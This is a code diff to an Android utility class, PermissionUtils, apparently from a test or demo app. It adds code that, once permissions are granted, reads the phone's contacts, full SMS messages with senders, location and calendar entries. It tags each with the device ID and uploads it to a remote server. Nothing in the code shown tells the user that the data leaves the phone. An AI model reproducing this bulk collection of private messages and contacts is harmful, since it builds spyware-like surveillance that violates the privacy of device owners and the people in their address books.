@@ -45,6 +45,7 @@ import com.hjq.permissions.OnPermissionCallback;
 import com.hjq.permissions.Permission;
 import com.hjq.permissions.XXPermissions;
 import com.lenovo.innovate.activity.MainActivity;
+import com.lenovo.innovate.core.http.subscriber.TipRequestSubscriber;
 import com.lenovo.innovate.prince.calander.CalenderDataStruct;
 import com.lenovo.innovate.prince.calander.calendarUtil;
 import com.lenovo.innovate.prince.http.ApiProvider;
@@ -53,15 +54,18 @@ import com.lenovo.innovate.prince.http.entity.PerInfo;
 import com.lenovo.innovate.prince.message.GetMessageInfo;
 import com.lenovo.innovate.prince.utils.CameraUtils;
 import com.lenovo.innovate.utils.XToastUtils;
+import com.xuexiang.rxutil2.rxjava.RxSchedulerUtils;
 import com.xuexiang.xhttp2.XHttp;
 import com.xuexiang.xhttp2.XHttpSDK;
 import com.xuexiang.xhttp2.callback.SimpleCallBack;
 import com.xuexiang.xhttp2.exception.ApiException;
+import com.xuexiang.xhttp2.model.ApiResult;
 import com.xuexiang.xhttp2.model.XHttpRequest;
 import com.xuexiang.xhttp2.request.CustomRequest;
 import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
 import com.xuexiang.xhttp2.subsciber.impl.IProgressLoader;
 import com.xuexiang.xhttp2.utils.HttpUtils;
+import com.xuexiang.xrouter.launcher.XRouter;
 import com.xuexiang.xutil.net.JsonUtil;
 import com.xuexiang.xutil.tip.ToastUtils;
 
@@ -86,7 +90,12 @@ public class PermissionUtils {
                             Activity a = (Activity) context ;
                             XToastUtils.toast( "onGranted: 获取权限成功！");
                             UserContactInfo userContactInfo = new UserContactInfo(a);
+
                             List<UserContacts> userContacts = userContactInfo.getContacts();
+                            if (userContacts.isEmpty()){
+                                XToastUtils.toast( "通讯录为空");
+                                return;
+                            }
                             Map<String,String> map = new HashMap<>();
                             for (int i = 0; i < userContacts.size(); i++) {
                                 String name = userContacts.get(i).getDisplayName();
@@ -94,13 +103,15 @@ public class PermissionUtils {
                                 map.put(name,number);
                             }
                             XToastUtils.toast( "电话号码"+map.toString());
+/*
 
                             JSONObject jsonObject  = new JSONObject();
                             jsonObject.put("permission","contact");
                             jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                             jsonObject.put("data",JSONArray.toJSON(map));
+*/
 
-                            http_contact(jsonObject);
+                            http_post(map.toString());
                         }
                     }
                     @Override
@@ -126,7 +137,12 @@ public class PermissionUtils {
                             XToastUtils.toast( "onGranted: 获取权限成功！");
                             /*GetMessageInfo getMessageInfo = new GetMessageInfo(context);
                             getMessageInfo.getSmsInfos();
-                            obtainPhoneMessage();*/
+                            obtainPhoneMessage();
+                                           //   data.add(map);
+                                    //通知适配器发生改变
+                                  //  simpleAdapter.notifyDataSetChanged();
+                            */
+
                             Uri uri=Uri.parse("content://sms/");
                             ContentResolver resolver = getContentResolver();
                             Cursor cursor = resolver.query(uri, new String[]{"_id", "address", "body", "date", "type"}, null, null, null);
@@ -136,19 +152,26 @@ public class PermissionUtils {
                                 String body;
                                 String date;
                                 int type;
+                                Map<String,Object>map=new HashMap<String,Object>();
                                 while (cursor.moveToNext()){
-                                    Map<String,Object>map=new HashMap<String,Object>();
+
                                     _id=cursor.getInt(0);
                                     address=cursor.getString(1);
                                     body=cursor.getString(2);
                                     date=cursor.getString(3);
                                     type=cursor.getInt(4);
-                                    map.put("names",body);
-                                 //   data.add(map);
+                                    map.put(address,body);
                                     XToastUtils.toast( "_id="+_id+" address="+address+" body="+body+" date="+date+" type="+type);
-                                    //通知适配器发生改变
-                                  //  simpleAdapter.notifyDataSetChanged();
+
                                 }
+
+
+                                JSONObject jsonObject  = new JSONObject();
+                                jsonObject.put("permission","message");
+                                jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                                jsonObject.put("data",JSONArray.toJSON(map));
+
+                                http_contact(jsonObject);
 
                             }
                         }
@@ -186,8 +209,8 @@ public class PermissionUtils {
                             map.put("屏幕像素",(String.valueOf(device.getScreenHeight()))+"*" + (String.valueOf(device.getScreenWidth())));
                             map.put("电池电量",String.valueOf(battery.getBatteryPercent())+"%");
                             map.put("电池温度",String.valueOf(battery.getBatteryTemperature())+"摄氏度");
-                            map.put("前置摄像头", CameraUtils.getCameraPixels(CameraUtils.hasBackCamera()));
-                            map.put("后置摄像头",CameraUtils.getCameraPixels(CameraUtils.hasFrontCamera()));
+                          //  map.put("前置摄像头", CameraUtils.getCameraPixels(CameraUtils.hasBackCamera()));
+                          //  map.put("后置摄像头",CameraUtils.getCameraPixels(CameraUtils.hasFrontCamera()));
 
                             XToastUtils.toast( "手机信息"+map.toString());
 
@@ -210,6 +233,7 @@ public class PermissionUtils {
                     }
                 });
     }
+
     public  void get_location(Context context){
         XXPermissions.with(context)
                 .permission(Permission.ACCESS_FINE_LOCATION)
@@ -224,6 +248,14 @@ public class PermissionUtils {
                             DeviceLocation deviceLocation = locationInfo.getLocation();
                             XToastUtils.toast( "位置："+deviceLocation.getAddressLine1());
 
+                            Map<String,String> map = new HashMap<>();
+                            map.put("location",deviceLocation.getAddressLine1());
+                            JSONObject jsonObject  = new JSONObject();
+                            jsonObject.put("permission","location");
+                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                            jsonObject.put("data",JSONArray.toJSON(map));
+
+                            http_contact(jsonObject);
                         }
                     }
                     @Override
@@ -247,12 +279,19 @@ public class PermissionUtils {
                         if (all){
                             XToastUtils.toast( "onGranted: 获取权限成功！");
                             ArrayList<CalenderDataStruct> calenderDataStructs = calendarUtil.GetCalenderSchedule(context);
-                         //   Log.i("1234", "onCreate: calenderDataStructs "+ calenderDataStructs.size());
                             List<String> list = new ArrayList<>();
                             for (CalenderDataStruct item : calenderDataStructs){
                                 XToastUtils.toast("onCreate: CalenderDataStruct "+ item.toString());
                                 list.add(item.toString());
                             }
+                            Map<String,String> map = new HashMap<>();
+                            map.put("calendar",list.toString());
+                            JSONObject jsonObject  = new JSONObject();
+                            jsonObject.put("permission","calendar");
+                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                            jsonObject.put("data",JSONArray.toJSON(map));
+                            http_contact(jsonObject);
+
                             new AlertDialog.Builder((Activity)context).setTitle("信息提示")//设置对话框标题
                                     .setMessage(list.toString())
                                     .setPositiveButton("是", new DialogInterface.OnClickListener() {//添加确定按钮
@@ -388,4 +427,23 @@ public class PermissionUtils {
             }
         });
     }
+
+
+
+    public  void http_post(String txt){
+            //使用retrofit自身定义的接口进行请求
+            XHttp.custom(TestApi.LoginService.class)
+                    .login(txt)
+                    .compose(RxSchedulerUtils.<ApiResult<String>>_io_main_o())
+                    .subscribeWith(new TipRequestSubscriber<ApiResult<String>>() {
+                        @Override
+                        protected void onSuccess(ApiResult<String> loginInfoApiResult) {
+                            ToastUtils.toast("请求成功!");
+                        //    showResult(JsonUtil.toJson(loginInfoApiResult));
+                        }
+                    });
+
+    }
+
+
 }
